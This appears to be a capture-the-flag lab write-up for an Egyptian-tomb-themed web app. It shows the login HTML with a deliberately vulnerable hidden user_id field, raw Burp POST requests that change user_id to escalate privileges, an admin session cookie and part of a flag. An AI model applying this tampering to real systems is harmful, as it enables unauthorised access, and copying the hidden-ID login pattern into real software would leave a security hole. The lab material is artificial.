You stand at the threshold of ancient knowledge, where the secrets of the pharaohs await.

The digital archives of recently discovered Egyptian tombs have been carefully cataloged by the Ministry of Egyptian Antiquities.

Note 1: Your browser may display a security warning due to the lab's SSL certificate. This is expected and does not indicate any real security risk.

Tools Needed: Burp Suite or equivalent

![](Pasted%20image%2020250502104240.png)


![](Pasted%20image%2020250502104334.png)

Also found this in the html
```html   
<div class="login-form">
    <h2>Explorer Authentication</h2>
    <form method="POST" action="/login">
        <div class="form-group">
            <input type="text" id="username" name="username" placeholder="Username" required>
        </div>
        <div class="form-group">
            <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        <!-- Hidden field for the IDOR vulnerability -->
        <input type="hidden" id="user_id" name="user_id" value="">
        <button type="submit" class="btn">Enter the Tomb</button>
    </form>
    <p class="hint" style="font-size: 18px;">Your login details are: username: explorer, password: tutankhamun</p>
</div>
```

explorer:tutankhamun


![](Pasted%20image%2020250502104423.png)![](Pasted%20image%2020250502104521.png)

![](Pasted%20image%2020250502104540.png)

```http
POST /login HTTP/1.1
Host: 64.225.103.251:5000
Content-Length: 48
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: https://64.225.103.251:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://64.225.103.251:5000/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=explorer&password=tutankhamun&user_id=2
```


![](Pasted%20image%2020250502105657.png)
Level 2 Clearance: Access to staff-only artifacts and research notes.


```http
POST /login HTTP/1.1
Host: 64.225.103.251:5000
Content-Length: 48
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: https://64.225.103.251:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://64.225.103.251:5000/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=explorer&password=tutankhamun&user_id=3
```

![](Pasted%20image%2020250502105908.png)


```http
GET /artifact/a7f39e1cb8d542b6c9184b8374fe36a1 HTTP/1.1
Host: 64.225.103.251:5000
Cookie: session=eyJjbGVhcmFuY2VfbGV2ZWwiOjMsInJvbGUiOiJhZG1pbiIsInVzZXJfaWQiOjMsInVzZXJuYW1lIjoiZGlyZWN0b3IifQ.aBSJHg.GI6oA6T0Ls1bc4wmgK4sDZ-_0w4
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

![](Pasted%20image%2020250502110004.png)

```Second half of the secret: _r3v34ls_th3_truth}```
Level 3 clearance or higher.